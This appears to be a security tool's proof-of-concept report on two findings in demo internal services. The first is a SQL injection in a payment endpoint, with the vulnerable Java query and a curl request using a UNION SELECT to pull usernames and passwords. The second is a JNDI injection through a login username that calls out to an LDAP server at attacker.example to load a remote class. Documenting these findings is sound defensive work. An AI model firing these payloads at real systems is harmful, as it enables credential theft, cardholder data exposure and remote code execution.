🔴 PoC #1 — SQL Injection

creditCard / shipmentId on /payments

dataservice · 3JVN-8RCN-4TC3-CGZL

Confirmed sink: PaymentController.executeRawQuery(PaymentController.java:55) → JdbcTemplate.execute(). User input is concatenated directly into the SQL string.

Vulnerable sink
String query = "SELECT * FROM payments WHERE card = '" + creditCard + "' AND shipment = '" + shipmentId + "'"; jdbcTemplate.execute(query); // tainted → executed
Exploit request
curl -X POST https://dataservice.cargocats.internal/payments \ -d "creditCard=4111' OR '1'='1" \ -d "shipmentId=1' UNION SELECT username,password FROM user-- "

Validation steps

  1. Recon — confirm /payments accepts the two parameters.
  2. Confirm — inject ' OR '1'='1 and observe altered result set.
  3. Impact — UNION-extract from the user table to prove data exfiltration.
💥

Impact

Full read/write access to the payments database — cardholder data exposure and integrity loss.

🔴 PoC #2 — JNDI Injection

username in Spring auth filter

frontgateservice · KGF4-0GBR-XY8K-KXKA

Sink: UsernamePasswordAuthenticationFilter.doFilter(). A crafted username reaches a JNDI lookup, enabling remote class loading.

Exploit request
curl -X POST https://frontgate.cargocats.internal/login \ -d "username=\${jndi:ldap://attacker.example/Exploit}" \ -d "password=x"

Validation steps

  1. Recon — start a controlled LDAP referral server you own.
  2. Confirm — submit the JNDI payload and observe the outbound LDAP callback.
  3. Impact — serve a benign marker class to prove remote code execution potential.
💥

Impact

Remote code execution in the authentication path — full application and host compromise.
